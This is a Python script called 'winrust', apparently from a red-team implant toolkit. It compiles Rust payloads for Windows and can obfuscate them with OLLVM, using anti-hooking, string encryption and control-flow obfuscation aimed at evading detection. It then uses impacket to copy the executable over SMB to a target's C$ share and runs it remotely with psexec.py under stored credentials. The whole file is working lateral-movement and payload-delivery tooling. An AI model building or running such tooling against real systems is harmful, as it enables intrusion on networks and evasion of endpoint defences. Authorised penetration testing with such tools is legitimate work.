import argparse
import logging
import sys
import uuid
import os
parser = argparse.ArgumentParser(
                    prog = 'winrust',
                    description = 'Tools to help from Linux to compile rust code Windows and then exec it into a Windows host by uploading with SMB + use some some impacket LateralMovement techniques',
                    epilog = 'by Brother')
parser.add_argument('bin',help='target bin')
parser.add_argument('--mem1',default=False,action='store_true',help='add a file in MEMORY_1 at compilation time, file should be located here: ~/.malleable/config/mem1')
parser.add_argument('--mem2',default=False,action='store_true',help='add a file in MEMORY_2 at compilation time, file should be located here: ~/.malleable/config/mem2')
parser.add_argument('--mem3',default=False,action='store_true',help='add a file in MEMORY_3 at compilation time, file should be located here: ~/.malleable/config/mem3')
parser.add_argument('--mem4',default=False,action='store_true',help='add a file in MEMORY_4 at compilation time, file should be located here: ~/.malleable/config/mem4')
parser.add_argument('-exec_target',default='',help='[[domain/]username[:password]@]<targetName or address>, by default use the content of ~/.exec')
parser.add_argument('-exec_method',default='psexec.py',help='Method to execute on the Windows side, default psexec.py')
parser.add_argument('--no_exec',default=False,action='store_true',help='Compile only and drop with smb to the target but dont execute')
#parser.add_argument('--no_drop',default=False,action='store_true',help='Compile only, dont drop to the target,dont execute')
parser.add_argument('--ollvm',default=False,action='store_true',help='OLLVM obfuscation, add the release flag automatically')
parser.add_argument('--release',default=False,action='store_true',help='activate the cargo release mode for compilation, sinon its debug')
parser.add_argument('--log','--debug',default=False,action='store_true',help='activate the agent debug log into STDOUT, you should also activate rust loggin via env variable: setx RUST_LOG info /m + setx RUST_LOG info')
parser.add_argument('--verbose','-v',default=False,action='store_true',help='verbose execution')

args = parser.parse_args()



def main():
    log = logging.getLogger("my-logger")
    if args.verbose:
        log.setLevel(logging.DEBUG)
    else:
        log.setLevel(logging.INFO)

    ch = logging.StreamHandler()
    ch.setLevel(logging.DEBUG)
    formatter = logging.Formatter("%(asctime)s %(levelname)s\t%(message)s")
    ch.setFormatter(formatter)
    log.addHandler(ch)

    if args.release or args.ollvm:
        mode='release'
        comm_mode='--release'
    else:
        mode='debug'
        comm_mode=''

    if args.log:
        comm_logdebug='--features logdebug'
    else:
        comm_logdebug=''

    if args.exec_target == '':
        #TODO if file not present
        with open(os.path.expanduser("~")+'/.exec') as file_read:
            exec_target=file_read.read().replace('\n','')

    else:
        exec_target=args.exec_target

    memory_options=args.mem1*' --features mem1 ' + args.mem2*' --features mem2 ' + args.mem3*' --features mem3 ' + args.mem4*' --features mem4 '

    file=f"target/x86_64-pc-windows-gnu/{mode}/{args.bin}.exe"
    filename=os.path.basename(file)
    filename_target=f"{args.bin}-{uuid.uuid4().hex}.exe"
    file_target=f"/tmp/{filename_target}"

    log.debug(f"file={file}")
    log.debug(f"filename={filename}")
    log.debug(f"filename_target={filename_target}")
    log.debug(f"file_target={file_target}")
    log.debug(f"exec_target={exec_target}")
    log.debug(f"memory_options={memory_options}")

    if not args.ollvm:
        log.info("[+] NORMAL Compilation")
        comm=f'''cargo build --target x86_64-pc-windows-gnu --bin "{args.bin}" {comm_mode} {comm_logdebug} {memory_options}'''
        log.info(comm)
        compil_result=os.system(comm)

    else:
        log.info("[+] OLLVM Compilation")
        os.system('cp ~/.malleable/config/initial.json* ~/.malleable/config/mem* config/')
        comm=f'''sudo docker run -v $(pwd):/projects/ -e LITCRYPT_ENCRYPT_KEY="$LITCRYPT_ENCRYPT_KEY" -it ghcr.io/joaovarelas/obfuscator-llvm-16.0 cargo rustc --bin "{args.bin}" --features ollvm {comm_logdebug} {memory_options} --target x86_64-pc-windows-gnu --release -- -Cdebuginfo=0 -Cstrip=symbols -Cpanic=abort -Copt-level=3 -Cllvm-args='-enable-acdobf -enable-antihook -enable-adb -enable-bcfobf -enable-cffobf -enable-splitobf -enable-subobf -enable-fco -enable-strcry -enable-constenc' '''
        log.info(comm)
        compil_result=os.system(comm)

    # compil_result=0 if compilation is OK
    if not compil_result:
        log.info('[+] compilation succeed')
        os.system('rm -f config/*')
        log.info(os.popen(f'ls -lah {file}').read().replace('\n',''))
        log.info(os.popen(f'file {file}').read().replace('\n',''))
        log.info(os.popen(f'sha256sum {file}').read().replace('\n',''))
        log.info(os.popen(f'sha1sum {file}').read().replace('\n',''))
        os.system(f'cp {file} {file_target}')

        if args.verbose:
            log.info(f'[+] upload file via SMB into: {exec_target}')
        else:
            log.info(f'[+] upload file via SMB into target')
        upload_comm=f'''
smbclient.py "{exec_target}" <<EOF
use C$
put {file_target}
ls {filename_target}
exit
EOF
'''
        os.system(upload_comm)
        if not args.no_exec:
            log.info(f'[+] exec c:\\{filename_target} with {args.exec_method}')
            exec_comm=f"{args.exec_method} {exec_target} c:\\\\{filename_target}"
            log.debug(exec_comm)
            os.system(exec_comm)
    else:
        log.info('[+] compilation failed')
        os.system('rm -f config/*')

if __name__ == '__main__':
    main()